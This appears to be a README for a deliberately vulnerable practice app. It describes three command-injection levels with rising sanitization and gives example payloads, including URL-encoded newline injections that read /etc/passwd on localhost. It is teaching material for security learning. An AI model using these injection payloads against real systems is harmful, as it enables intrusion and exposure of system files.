# Command Injection

The app is divided into three levels: Weak, Medium, and Strong. Each level introduces progressively stronger input sanitization, making it harder to exploit.

## Command Injection Levels

### 1. Weak Level
- **Description**: This level has no input sanitization, any user input is executed as a system command directly.
- **Exploit Example**:
  ```
  ping 127.0.0.1; ls
  ```

---

### 2. Medium Level
- **Description**: Removed basic dangerous characters like `;`, `&`, and `|`.
- **Exploit Example**:
  ```
  # let's encode \n and
  http://localhost:8000/cmd-injection/cmd_injection?input=ping%20-c%201%20127.0.0.1%0Als
  # or get /etc/passwd content
  http://localhost:8000/cmd-injection/cmd_injection?input=ping%20-c%201%20127.0.0.1%0Acat%20/etc/passwd
  ```

---

### 3. Strong Level
- **Description**: This level applies stricter sanitization, removing dangerous characters like `&&`, `||`, `$()` and more.
- **Exploit Example**:
  Attempting direct injection is highly unlikely to succeed. However, creative bypass methods might still exist.
---
